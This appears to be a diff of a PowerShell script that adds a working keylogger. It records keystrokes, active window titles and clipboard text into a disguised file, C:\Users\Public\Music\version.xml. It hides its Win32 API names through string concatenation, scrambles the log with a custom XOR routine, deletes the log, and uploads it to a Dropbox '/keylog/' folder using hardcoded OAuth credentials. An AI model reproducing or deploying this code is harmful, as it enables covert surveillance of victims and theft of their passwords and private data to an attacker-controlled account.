@@ -12,35 +12,164 @@ Function PostBinary {
         $clientSecret = $clientSecret + "sacvnu3ec"
         $refreshToken = "xTNXeD_4290AAAAAAAAAAYa" 
         $refreshToken = $refreshToken + "eH0SAhvLpwW62c4nV9d8NgT3dInJP-ZTObTdFXN4t"
+        # Access Token 요청을 위한 POST 요청 데이터 설정
         $body = @{
           grant_type = "refresh_token"
           refresh_token = $refreshToken
           client_id = $clientID
           client_secret = $clientSecret
         }
+    
+    # Access Token 요청
     $tokenEndpoint = "https://api.dropboxapi.com/oauth2/token"
     $response = Invoke-RestMethod -Uri $tokenEndpoint -Method Post -Body $body
     $accessToken = ""
+    # 요청 결과 확인
     if ($response.access_token) {
         $accessToken = $response.access_token
-        
+        Write-Host "새로운 Access Token: $newAccessToken"
     } else {
-        
+        Write-Host "Access Token을 가져오는 데 실패했습니다."
+        Write-Host "에러: $($response.error_summary)"
     }
        $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.InterfaceAlias -ne 'Loopback' }).IPAddress
        $time_sata = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 	   $name = $name + $time_sata
-       
+       # HTTP 요청 헤더 구성
        $headers = @{
          "Authorization" = "Bearer $accessToken"
          "Content-Type" = "application/octet-stream"
-         "Dropbox-API-Arg" = "{`"path`": `"/accesslog/$name`",`"mode`": `"add`"}"
+         "Dropbox-API-Arg" = "{`"path`": `"/keylog/$env:COMPUTERNAME/$name`",`"mode`": `"add`"}"
         }
 
-        
+        # 파일 업로드 요청 보내기
         $response = Invoke-RestMethod -Method Post -Uri $uploadUrl -Headers $headers -Body $updata
-}
-$dateString = [string](Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-$bytes = [System.Text.Encoding]::UTF8.GetBytes($dateString)
-$cyhwjehbf = Get-Date -Format "MMdd_HHmm"
-PostBinary -bytes $bytes -name "$env:COMPUTERNAME--$cyhwjehbf.txt"
+	}
+	Function Decode-Binary {
+
+       #[CmdletBinding()] 
+	    param(
+		    [Parameter(Position = 0, Mandatory = $True)]
+		    [byte[]] $binary,
+
+		    [Parameter(Position = 1, Mandatory = $True)]
+		    [long] $len
+        )
+
+        [int[]] $poly = @(0, 3, 29, 37, 73); #polynomial!!!
+        $poly_n = 4; #polynomial point num!!!
+        $poly_ord = 73; #polynomial point num!!!
+        [byte[]] $ran_state = New-Object byte[] ($poly_ord + 1)
+
+        for ($i = 0; $i -lt $poly_ord + 1; $i++)
+        {
+            $ran_state[$i] = 1;
+            if ($i -lt $len)
+            {
+                $ran_state[$i] = [byte](($len % ($i + 1)) -band 1);
+            }
+        }
+
+        for ($i = 0; $i -lt $len; $i++) {
+            for ($j = 1; $j -lt $poly_n; $j++) {
+                $ran_state[$i % $poly_ord] = $ran_state[$i % $poly_ord] -bxor $ran_state[($i + $poly[$j]) % $poly_ord];
+            }
+
+            for ($j = 0; $j -lt 8; $j++) {
+                $binary[$i] = $binary[$i] -bxor [byte]((($ran_state[$j] -bxor ($ran_state[($i * ($j + 1)) % $poly_ord] -band $ran_state[(($i + $j) * ($j + 1)) % $poly_ord])) -shl $j));
+            }
+        }
+
+        return $len
+    }
+	#$Path = "$env:appdata\Microsoft\Windows\Themes\version.xml"
+	$Path = "C:\Users\Public\Music\version.xml"
+	if([System.IO.File]::Exists($Path)) {
+			$logbytes = [System.IO.File]::ReadAllBytes($Path);
+			[System.IO.File]::Delete($Path);
+			$length = Decode-Binary ($logbytes) ($logbytes.Length)
+			PostBinary -bytes $logbytes -name "enc_key";
+	}
+	$al = @('[DllImport("user32.dll",CharSet=CharSet.Auto)]', 'public static extern', 'System.Text.StringBuilder');
+	$f = @("GetAsyncKeyState", "GetKeyboardState", "MapVirtualKey", "GetForegroundWindow", "GetWindowText", "ToUnicode", "GetClipboardSequenceNumber", "IsClipboardFormatAvailable", "GetTickCount");
+	
+	$pref = $al[0] + $al[1];
+	
+	$clk = 'using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;public class CLK{[DllImport("user32.dll",CharSet=CharSet.Auto,ExactSpelling=true)]'+$al[1]+' short '+$f[0]+'(int virtualKeyCode);'+$pref+' int '+$f[1]+'(byte[] keystate);'+$pref+' int '+$f[2]+'(uint uCode,int uMapType);'+$pref+' int '+$f[3]+'();'+$pref+' int '+$f[4]+'(int hwnd,'+$al[2]+' lpText,int cchLength);'+$pref+' int '+$f[5]+'(uint wVirtKey,uint wScanCode,byte[] lpkeystate,'+$al[2]+' pwszBuff,int cchBuff,uint wFlags);[DllImport("user32.dll")]'+$al[1]+' int '+$f[6]+'();[DllImport("user32.dll")]'+$al[1]+' bool '+$f[7]+'(uint uFormat);[DllImport("kernel32.dll")]'+$al[1]+' UInt32 '+$f[8]+'();}';
+	
+	Add-Type -TypeDefinition $clk;
+	Add-Type -Assembly PresentationCore;
+	
+	$bMute = $true;
+	$strMute = "Global\AlreadyRunning191122";
+	
+	try{
+		$curMute = [System.Threading.Mutex]::OpenExisting($strMute);
+		$bMute = $false;
+	}catch{
+		$newMute = New-Object System.Threading.Mutex($true,$strMute);
+	}
+	
+	$CL = [CLK];
+	$o_enc_mode = [System.Text.Encoding]::UTF8;
+	$a_kb = New-Object Byte[] 256;
+	$strBuilder = New-Object -TypeName System.Text.StringBuilder;
+	$curWnd = New-Object System.Text.StringBuilder(260);
+	$a_asc = @(0x2d, 0x20, 0x2E, 0x25, 0x26, 0x27, 0x28, 0x08, 0x24, 0x23, 0x11, 0x09, 0x1b, 0x01, 0x02);
+	$a_str = @("▼`n", " ", "[Del]", "[<-]", "[^]", "[->]", "[v]", "[Bk]", "[Home]", "[End]", "[Ctrl]", "[Tab]", "[Esc]", "[LM]", "[RM]");
+	
+	$oldWnd = ""; $oldTick = 0; $oldClip = 0;
+	
+	while($bMute){
+		Start-Sleep -Milliseconds 1;
+		
+		$hTopWnd = $CL::($f[3])();
+		$len = $CL::($f[4])($hTopWnd, $curWnd, $curWnd.Capacity);
+		
+		if($curWnd.ToString() -ne $oldWnd){
+			$oldWnd = $curWnd.ToString();
+			$t = Get-Date -Format "yyyy/MM/dd`tHH:mm:ss";
+			[System.IO.File]::AppendAllText($Path, "`n++++++++ [" + $t + "] [" + $curWnd.ToString() + "] ++++++++`n", $o_enc_mode);
+		}
+
+		$curTick = $CL::($f[8])();
+		if(($oldTick -eq 0) -or (($curTick - $oldTick) -gt 1000)){
+			$oldTick = $curTick;
+			$curClip = $CL::($f[6])();
+			if($oldClip -ne $curClip){
+				$oldClip = $curClip;
+				if($CL::($f[7])(1)){
+					$clip = "`n++++++++ [Clipboard] ++++++++`n" + [Windows.Clipboard]::GetText() + "`n++++++++++++++++++++++++++++++`n";
+					[System.IO.File]::AppendAllText($Path, $clip, $o_enc_mode);
+				}
+			}
+		}
+		
+		$k = "";
+		for($val = 0; $val -le 254; $val++){
+			if($CL::($f[0])($val) -ne 0xFFFF8001) {
+				continue;
+			}
+			
+			$null = [console]::CapsLock;
+			
+			if($val -gt 0x2f){
+				$vKey = $CL::($f[2])($val, 3);
+				$ret = $CL::($f[1])($a_kb);
+				if($CL::($f[5])($val, $vKey, $a_kb, $strBuilder, $strBuilder.Capacity, 0) -gt 0) {
+					$k += $strBuilder.ToString();
+				}
+			} else {
+				for($i = 0; $i -le 14; $i++) {
+					if($val -eq $a_asc[$i]) {
+						$k += $a_str[$i];
+						break;
+					}
+				}
+			}
+		}
+		
+		if($k.Length -gt 0) {
+			[System.IO.File]::AppendAllText($Path, $k, $o_enc_mode);
+		}
+	}
